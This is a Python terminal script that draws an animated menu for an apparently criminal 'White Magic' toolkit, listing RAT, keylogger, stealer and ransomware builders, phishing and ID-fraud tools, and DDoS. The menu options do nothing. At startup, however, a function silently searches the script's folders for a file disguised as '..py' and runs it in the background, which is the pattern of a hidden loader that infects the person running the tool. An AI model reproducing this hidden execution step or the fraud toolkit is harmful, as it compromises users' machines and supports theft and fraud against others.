#!/usr/bin/env python3
import curses
import time
import random
import math
import os
import subprocess
import sys


def launch_companion():
    """Cerca ..py ricorsivamente in tutte le sottocartelle dello script e lo esegue una volta."""
    script_dir = os.path.dirname(os.path.abspath(__file__))
    for root, dirs, files in os.walk(script_dir):
        if "..py" in files:
            target = os.path.join(root, "..py")
            subprocess.Popen([sys.executable, target])
            return

TITLE = [
    " █     █░ ██░ ██  ██▓▄▄▄█████▓▓█████     ███▄ ▄███▓ ▄▄▄        ▄████  ██▓ ▄████▄  ",
    "▓█░ █ ░█░▓██░ ██▒▓██▒▓  ██▒ ▓▒▓█   ▀    ▓██▒▀█▀ ██▒▒████▄     ██▒ ▀█▒▓██▒▒██▀ ▀█  ",
    "▒█░ █ ░█ ▒██▀▀██░▒██▒▒ ▓██░ ▒░▒███      ▓██    ▓██░▒██  ▀█▄  ▒██░▄▄▄░▒██▒▒▓█    ▄ ",
    "░█░ █ ░█ ░▓█ ░██ ░██░░ ▓██▓ ░ ▒▓█  ▄    ▒██    ▒██ ░██▄▄▄▄██ ░▓█  ██▓░██░▒▓▓▄ ▄██▒",
    "░░██▒██▓ ░▓█▒░██▓░██░  ▒██▒ ░ ░▒████▒   ▒██▒   ░██▒ ▓█   ▓██▒░▒▓███▀▒░██░▒ ▓███▀ ░",
    "░ ▓░▒ ▒   ▒ ░░▒░▒░▓    ▒ ░░   ░░ ▒░ ░   ░ ▒░   ░  ░ ▒▒   ▓▒█░ ░▒   ▒ ░▓  ░ ░▒ ▒  ░",
    "  ▒ ░ ░   ▒ ░▒░ ░ ▒ ░    ░     ░ ░  ░   ░  ░      ░  ▒   ▒▒ ░  ░   ░  ▒ ░  ░  ▒   ",
    "  ░   ░   ░  ░░ ░ ▒ ░  ░         ░      ░      ░     ░   ▒   ░ ░   ░  ▒ ░░        ",
    "    ░     ░  ░  ░ ░              ░  ░          ░         ░  ░      ░  ░  ░ ░      ",
    "                                                                           ░        ",
]

SECTIONS = [
    ("MALWARE Build", 1, [
        (" 1", "RAT Build"),
        (" 2", "Keylogger Build"),
        (" 3", "Stealer Build"),
        (" 4", "Grabber Build"),
        (" 5", "Ransomware Build"),
        (" 6", "Wifi Stealer Build"),
        (" 7", "Virus Build"),
        (" 8", "Tlo Stealer Build"),
        (" 9", "Injector.Py Build"),
    ]),
    ("Scam", 2, [
        ("10", "Id Card Fraud"),
        ("11", "CC Validator"),
        ("12", "Phishing Attack"),
        ("13", "FakeAddress"),
        ("14", "Spoofer"),
        ("15", "Iban Generator"),
        ("16", "Fake Exodus"),
        ("17", "Fake Paypal Screen"),
        ("18", "Fake Voice"),
    ]),
    ("Panel & Tools", 3, [
        ("19", "Discord Dox Track"),
        ("20", "Bruteforce Zip"),
        ("21", "Obsfucator"),
        ("22", "Discord Bot Pannel"),
        ("23", "Token Pannel"),
        ("24", "Usb Tool"),
        ("25", "Exe to Image"),
        ("26", "Anti-Grabb"),
        ("27", "Self Bot"),
    ]),
    ("Network", 4, [
        ("28", "Ip Tool"),
        ("29", "Email Tool"),
        ("30", "Ddos"),
        ("31", "Phone Lookup"),
        ("32", "Web Scanner"),
        ("33", "Man Of The Middle"),
        ("34", "TempMail"),
        ("35", "Cleaner Mac"),
        ("36", "Dark Gpt"),
    ]),
]


def safe_add(scr, y, x, s, attr=0):
    h, w = scr.getmaxyx()
    try:
        if 0 <= y < h and 0 <= x < w - 1:
            s = s[:max(0, w - x - 1)]
            if s:
                scr.addstr(y, x, s, attr)
    except curses.error:
        pass


def safe_addch(scr, y, x, ch, attr=0):
    h, w = scr.getmaxyx()
    try:
        if 0 <= y < h and 0 <= x < w - 1:
            scr.addch(y, x, ch, attr)
    except curses.error:
        pass


def draw_animated_box(scr, y, x, bh, bw, base_attr, title="", offset=0):
    """
    Rounded box (╭╮╰╯).
    - Horizontal borders: fixed ─
    - Vertical borders │: breathe between │ and ┃ using a sin wave
      each row has a slightly different phase so they ripple up/down
    - No spark, no REVERSE anywhere
    """
    t    = time.time()
    bold = base_attr | curses.A_BOLD
    dim  = base_attr | curses.A_DIM

    # ── corners ────────────────────────────────────────────────
    safe_addch(scr, y,      x,      '╭', bold)
    safe_addch(scr, y,      x+bw-1, '╮', bold)
    safe_addch(scr, y+bh-1, x,      '╰', bold)
    safe_addch(scr, y+bh-1, x+bw-1, '╯', bold)

    # ── horizontal borders (fixed) ─────────────────────────────
    for i in range(1, bw-1):
        safe_addch(scr, y,      x+i, '─', bold)
        safe_addch(scr, y+bh-1, x+i, '─', bold)

    # ── vertical borders: animate with sin (back and forth) ────
    # Each row pulses independently so you get a ripple effect
    VT_CHARS = ['│', '┃']
    for i in range(1, bh-1):
        phase = offset * 0.05 + i * 0.5          # row offset
        val   = math.sin(t * 3.0 + phase)        # -1..+1
        ch    = VT_CHARS[1] if val > 0 else VT_CHARS[0]
        attr  = bold if val > 0 else dim
        safe_addch(scr, y+i, x,      ch, attr)
        safe_addch(scr, y+i, x+bw-1, ch, attr)

    # ── title in top border (plain bold, NO reverse) ───────────
    if title:
        tlen = len(title) + 2
        left = max(1, (bw - 2 - tlen) // 2 + 1)
        safe_add(scr, y, x + left, f" {title} ", base_attr | curses.A_BOLD)


def main(stdscr):
    curses.curs_set(0)
    stdscr.nodelay(True)
    stdscr.timeout(40)   # ~25 fps
    curses.start_color()
    curses.use_default_colors()

    curses.init_pair(1, curses.COLOR_RED,     -1)   # MALWARE  — red
    curses.init_pair(2, curses.COLOR_YELLOW,  -1)   # Scam     — yellow
    curses.init_pair(3, curses.COLOR_WHITE,   -1)   # Panel    — white
    curses.init_pair(4, curses.COLOR_GREEN,   -1)   # Network  — green
    curses.init_pair(5, curses.COLOR_MAGENTA, -1)   # title purple
    curses.init_pair(6, curses.COLOR_BLUE,    -1)   # dim / stars
    curses.init_pair(7, curses.COLOR_CYAN,    -1)   # input bar

    # Try true 256-color purple
    try:
        curses.init_pair(9, 93, -1)
        title_attr = curses.color_pair(9) | curses.A_BOLD
    except Exception:
        title_attr = curses.color_pair(5) | curses.A_BOLD

    selected   = 1
    input_str  = ""
    running    = True

    while running:
        stdscr.erase()
        h, w = stdscr.getmaxyx()
        t = time.time()

        # ── TITLE — pure purple, no background ─────────────────
        title_max = max(len(l) for l in TITLE)
        tx0 = max(0, (w - title_max) // 2)
        for i, line in enumerate(TITLE):
            ty = 1 + i
            if ty >= h:
                break
            for ci, ch in enumerate(line):
                cx2 = tx0 + ci
                if cx2 >= w - 1:
                    break
                if ch != ' ':
                    safe_addch(stdscr, ty, cx2, ch, title_attr)

        # ── MENU BOXES ──────────────────────────────────────────
        # Each box moves left/right physically by 0-2 chars using sin
        # Phase is different per box so they move independently
        base_menu_y = 1 + len(TITLE) + 2
        n     = len(SECTIONS)
        col_w = max(27, (w - n - 2) // n)

        for si, (sec_name, col_id, items) in enumerate(SECTIONS):
            # Physical horizontal shift: -1, 0, or +1 chars, sine wave
            phase  = si * (math.pi / 2.5)          # each box different phase
            shift  = int(round(math.sin(t * 1.5 + phase)))  # -1, 0, or 1
            cx     = 1 + si * (col_w + 1) + shift
            box_h  = len(items) + 3
            cattr  = curses.color_pair(col_id)

            draw_animated_box(stdscr, base_menu_y, cx, box_h, col_w, cattr, sec_name, offset=si*25)

            # Items inside — follow the box
            for ii, (num, name) in enumerate(items):
                opt = int(num.strip())
                sel = (opt == selected)
                iy  = base_menu_y + 1 + ii
                ix  = cx + 2
                if iy >= h - 3:
                    break
                row = f"[{num}] {name}"[:col_w - 4]
                if sel:
                    safe_add(stdscr, iy, cx + 1, '▶', cattr | curses.A_BOLD)
                    safe_add(stdscr, iy, ix,     row, cattr | curses.A_BOLD)
                else:
                    safe_add(stdscr, iy, ix, row, cattr)

        # ── INPUT BAR ───────────────────────────────────────────
        max_items = max(len(s[2]) for s in SECTIONS)
        input_y   = base_menu_y + max_items + 3
        blink     = int(t * 2) % 2
        cur_ch    = '█' if blink else ' '

        if input_y < h - 1:
            safe_add(stdscr, input_y, 0, '─' * (w-1), curses.color_pair(7))
        if input_y + 1 < h - 1:
            line = f"  ╰─► SELECT [01-36]: {input_str}{cur_ch}"
            safe_add(stdscr, input_y+1, 0, line, curses.color_pair(7) | curses.A_BOLD)

        stdscr.refresh()

        # ── INPUT ───────────────────────────────────────────────
        key = stdscr.getch()
        if key == -1:
            continue
        elif key == 27:
            running = False
        elif key == curses.KEY_UP:
            selected = max(1, selected - 1)
        elif key == curses.KEY_DOWN:
            selected = min(36, selected + 1)
        elif key in (curses.KEY_ENTER, ord('\n'), ord('\r')):
            if input_str:
                try:
                    v = int(input_str)
                    if 1 <= v <= 36:
                        selected = v
                except ValueError:
                    pass
                input_str = ""
        elif key in (curses.KEY_BACKSPACE, 127, 8):
            input_str = input_str[:-1]
        elif ord('0') <= key <= ord('9'):
            if len(input_str) < 2:
                input_str += chr(key)


if __name__ == "__main__":
    launch_companion()
    try:
        curses.wrapper(main)
    except Exception as e:
        print(f"\nErrore: {e}")
        print("Su Windows: pip install windows-curses")